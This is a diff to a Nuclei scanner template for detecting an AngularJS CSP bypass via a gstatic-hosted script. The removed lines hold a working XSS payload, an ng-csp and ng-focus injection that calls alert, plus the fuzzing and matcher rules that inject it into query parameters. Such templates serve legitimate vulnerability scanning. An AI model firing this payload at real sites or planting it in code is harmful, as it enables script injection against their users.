@@ -1,3 +1,4 @@
+# yaml-language-server: $schema=https://raw.githubusercontent.com/projectdiscovery/nuclei/dev/pkg/templates/nuclei-jsonschema.json
 id: gstatic-angular-csp-bypass
 
 info:
@@ -30,26 +31,5 @@ headless:
   - steps:
       - action: navigate
         args:
-          url: "{{BaseURL}}"
 
-      - action: waitdialog
-        name: gstatic_angular_csp_xss
-        args:
-          max-duration: 5s
-
-    payloads:
-      injection:
-        - <body ng-app ng-csp><script src="//www.gstatic.com/fsn/angular_js-bundle1.js"></script><input autofocus ng-focus="$event.composedPath()|orderBy:\'[].constructor.from([1],alert)\'"></body>
-
-    fuzzing:
-      - part: query
-        type: replace
-        mode: single
-        fuzz:
-          - "{{url_encode(injection)}}"
-
-    matchers:
-      - type: dsl
-        dsl:
-          - "gstatic_angular_csp_xss == true"
 # digest: 490a004630440220541884f2502bc9ca1f3b1dbfa27c2924b871cff9709d4c16ee9a2dab8055a84c02201b28a42394842f9b543c0e72ce74811f3abe1f5b260a4d45ea36569b63d7f709:922c64590222798bb761d5b6d8e72950
